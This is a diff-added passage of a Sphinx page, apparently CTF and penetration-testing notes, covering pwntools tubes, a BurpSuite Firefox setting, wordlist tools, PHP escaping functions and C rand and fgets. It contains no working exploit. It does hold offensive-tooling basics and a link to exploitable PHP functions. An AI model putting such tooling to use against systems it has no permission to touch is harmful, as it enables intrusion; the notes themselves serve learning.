+<h5>Interactive Sessions<a class="headerlink" href="#interactive-sessions" title="Link to this heading"></a></h5>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Let&#39;s pretend we&#39;re uber 1337 and landed a shell.</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+
+<span class="c1"># &lt;exploit goes here&gt;</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+</section>
+<section id="networking">
+<h5>Networking<a class="headerlink" href="#networking" title="Link to this heading"></a></h5>
+<p>Creating a network connection is also easy, and has the exact same interface.  A <cite>remote</cite> object connects to somewhere else, while a <cite>listen</cite> object waits for a connection.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;google.com&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;GET /</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="c1"># &#39;HTTP/1.0 200 OK\r\n&#39;</span>
+</pre></div>
+</div>
+<p>If you need to specify protocol information, it’s also pretty straightforward.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">dns</span>  <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;8.8.8.8&#39;</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="n">typ</span><span class="o">=</span><span class="s1">&#39;udp&#39;</span><span class="p">)</span>
+<span class="n">tcp6</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;google.com&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="n">fam</span><span class="o">=</span><span class="s1">&#39;ipv6&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Listening for connections isn’t much more complex.  Note that this listens for exactly one connection, then stops listening.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">8080</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+</pre></div>
+</div>
+</section>
+<section id="secure-shell">
+<h5>Secure Shell<a class="headerlink" href="#secure-shell" title="Link to this heading"></a></h5>
+<p>SSH connectivity is similarly simple.  Compare the code below with that in “Hello Process” above.</p>
+<p>You can also do more complex things with SSH, such as port forwarding and file upload / download.  See the [SSH tutorial][ssh] for more information.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;bandit0&#39;</span><span class="p">,</span> <span class="s1">&#39;bandit.labs.overthewire.org&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;bandit0&#39;</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;PS1&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">})</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello, world!&#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="c1"># &#39;Hello, world!\n&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="serial-ports">
+<h5>Serial Ports<a class="headerlink" href="#serial-ports" title="Link to this heading"></a></h5>
+<p>In the event you need to get some local hacking done, there’s also a serial tube.  As always, there is more information in the [full online documentation][serial].</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">serialtube</span><span class="p">(</span><span class="s1">&#39;/dev/ttyUSB0&#39;</span><span class="p">,</span> <span class="n">baudrate</span><span class="o">=</span><span class="mi">115200</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Importing</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</pre></div>
+</div>
+<p>Making Connections</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ftp.ubuntu.com&#39;</span><span class="p">,</span><span class="mi">21</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Receiving Lines</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Sending Lines</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;USER anonymous</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="id1">
+<h4><a class="reference external" href="https://docs.pwntools.com/en/stable/util/fiddling.html#">Util.fiddling</a><a class="headerlink" href="#id1" title="Link to this heading"></a></h4>
+<ul class="simple">
+<li><p>unbits: Converts an iterable of bits into a string.</p></li>
+<li><p>unhex: Hex-decodes a string.</p></li>
+</ul>
+<section id="pwn-templates">
+<h5>Pwn Templates<a class="headerlink" href="#pwn-templates" title="Link to this heading"></a></h5>
+<p><a class="reference external" href="https://github.com/Gallopsled/pwntools/pull/909">pwn template</a> command can be used for generating templates.</p>
+</section>
+</section>
+<section id="ctypes">
+<h4>ctypes<a class="headerlink" href="#ctypes" title="Link to this heading"></a></h4>
+<p>A foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries. It can be used to wrap these libraries in pure Python. ctypes exports the cdll, and on Windows windll and oledll objects, for loading dynamic link libraries.</p>
+</section>
+</section>
+</section>
+<section id="php">
+<h2>PHP<a class="headerlink" href="#php" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection.</p></li>
+<li><p>filter_var — Filters a variable with a specified filter. There are multiple types of <a class="reference external" href="http://php.net/manual/en/filter.filters.php">filter</a> such as Validate, Sanitize etc.</p></li>
+<li><p><a class="reference external" href="https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720">Exploitable PHP Functions</a></p></li>
+</ul>
+</section>
+<section id="burpsuite">
+<h2>BurpSuite<a class="headerlink" href="#burpsuite" title="Link to this heading"></a></h2>
+<ol class="arabic simple">
+<li><p>In a new tab, type or paste <a class="reference external" href="about:config">about:config</a> in the address bar and press Enter/Return. Click the button promising to be careful.</p></li>
+<li><p>In the search box above the list, type or paste captiv and pause while the list is filtered</p></li>
+</ol>
+<p>(3) Double-click the network.captive-portal-service.enabled preference to switch the value from true to false
+If you are in a managed environment using an autoconfig file, for example, you could use this to switch the default:
+user_pref(“network.captive-portal-service.enabled”, false);</p>
+</section>
+<section id="generating-wordlists">
+<h2>Generating Wordlists<a class="headerlink" href="#generating-wordlists" title="Link to this heading"></a></h2>
+<p>Many times we need to generate a wordlist. There are multiple tools for it.</p>
+<section id="cewl">
+<h3>cewl<a class="headerlink" href="#cewl" title="Link to this heading"></a></h3>
+</section>
+<section id="crunch">
+<h3>crunch<a class="headerlink" href="#crunch" title="Link to this heading"></a></h3>
+</section>
+</section>
+<section id="c-programming">
+<h2>C Programming<a class="headerlink" href="#c-programming" title="Link to this heading"></a></h2>
+<section id="functions">
+<h3>Functions<a class="headerlink" href="#functions" title="Link to this heading"></a></h3>
+<section id="randomization">
+<h4>Randomization<a class="headerlink" href="#randomization" title="Link to this heading"></a></h4>
+<section id="rand">
+<h5>rand<a class="headerlink" href="#rand" title="Link to this heading"></a></h5>
+<p>Generate random number: Returns a pseudo-random integral number in the range between 0 and RAND_MAX.</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="nf">rand</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+</pre></div>
+</div>
+<ul>
+<li><p>This number is generated by an algorithm that returns a sequence of apparently non-related numbers each time it is called. This algorithm uses a seed to generate the series, which should be initialized to some distinctive value using function srand.</p></li>
+<li><p>A typical way to generate trivial pseudo-random numbers in a determined range using rand is to use the modulo of the returned value by the range span and add the initial value of the range:</p>
+<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="n">v1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w">         </span><span class="c1">// v1 in the range 0 to 99</span>
+<span class="n">v2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">100</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">     </span><span class="c1">// v2 in the range 1 to 100</span>
+<span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1985</span><span class="p">;</span><span class="w">   </span><span class="c1">// v3 in the range 1985-2014</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Notice though that this modulo operation does not generate uniformly distributed random numbers in the span (since in most cases this operation makes lower numbers slightly more likely).</p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="srand">
+<h5>srand<a class="headerlink" href="#srand" title="Link to this heading"></a></h5>
+<p>The pseudo-random number generator is initialized using the argument passed as seed.</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">void</span><span class="w"> </span><span class="nf">srand</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">seed</span><span class="p">);</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>For every different seed value used in a call to srand, the pseudo-random number generator can be expected to generate a different succession of results in the subsequent calls to rand.</p></li>
+<li><p>Two different initializations with the same seed will generate the same succession of results in subsequent calls to rand.</p></li>
+<li><p>If seed is set to 1, the generator is reinitialized to its initial value and produces the same values as before any call to rand or srand.</p></li>
+</ul>
+</section>
+</section>
+<section id="read">
+<h4>Read<a class="headerlink" href="#read" title="Link to this heading"></a></h4>
+<section id="fgets">
+<h5>fgets<a class="headerlink" href="#fgets" title="Link to this heading"></a></h5>
+<p>The C library function <code class="docutils literal notranslate"><span class="pre">fgets</span></code> reads a line from the specified stream and stores it into the string pointed to by str. It stops when either (n-1) characters are read, the newline character is read, or the end-of-file is reached, whichever comes first.</p>
+<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fgets</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">stream</span><span class="p">)</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>str:  pointer to an array of chars where the string read is stored.</p></li>
+<li><p>n: maximum number of characters to be read (including the final null-character). Usually, the length of the array passed as str is used.</p></li>
+<li><p>stream: pointer to a FILE object that identifies the stream where characters are read from.</p></li>
+</ul>
+<section id="return-value">
+<h6>Return value<a class="headerlink" href="#return-value" title="Link to this heading"></a></h6>
+<p>On success, the function returns the same str parameter.</p>
+<ul class="simple">
+<li><p>If the End-of-File is encountered and no characters have been read, the contents of str remain unchanged and a null pointer is returned.</p></li>
+<li><p>If an error occurs, a null pointer is returned.</p></li>
+</ul>
+</section>
+</section>
+</section>
+</section>
+</section>
+<section id="data-conversion">
+<h2>Data conversion<a class="headerlink" href="#data-conversion" title="Link to this heading"></a></h2>
+<section id="hex">
+<h3>Hex<a class="headerlink" href="#hex" title="Link to this heading"></a></h3>
+<section id="hex-from-little-endian-to-big-endian">
+<h4>Hex from little endian to big-endian<a class="headerlink" href="#hex-from-little-endian-to-big-endian" title="Link to this heading"></a></h4>
+<p>One-liner</p>
+<ul class="simple">
+<li><p>first converts the hexadecimal string to a bytearray,</p></li>
+<li><p>then reverses the order of the elements in the bytearray using <code class="docutils literal notranslate"><span class="pre">[::-1]</span></code>, and</p></li>
+<li><p>finally converts the reversed bytearray back to a hexadecimal string using <code class="docutils literal notranslate"><span class="pre">.hex()</span></code>.</p></li>
+</ul>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">hex_str</span> <span class="o">=</span> <span class="s2">&quot;AABBCCDD&quot;</span>
+<span class="n">result</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+<span class="c1">#DDCCBBAA</span>
+</pre></div>
+</div>
+</section>
+<section id="hex-to-ascii">
+<h4>Hex to ASCII<a class="headerlink" href="#hex-to-ascii" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">part_flag = &quot;7069636f&quot;</span>
+<span class="go">bytes.fromhex(part_flag)</span>
+<span class="gp"># </span>b<span class="s1">&#39;pico&#39;</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="LFC-Cryptography.html" class="btn btn-neutral float-left" title="Cryptography" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html" class="btn btn-neutral float-right" title="Electrical Grid" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
+  </div>
+
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(false);
+      });
+  </script> 
+
+</body>
+</html>
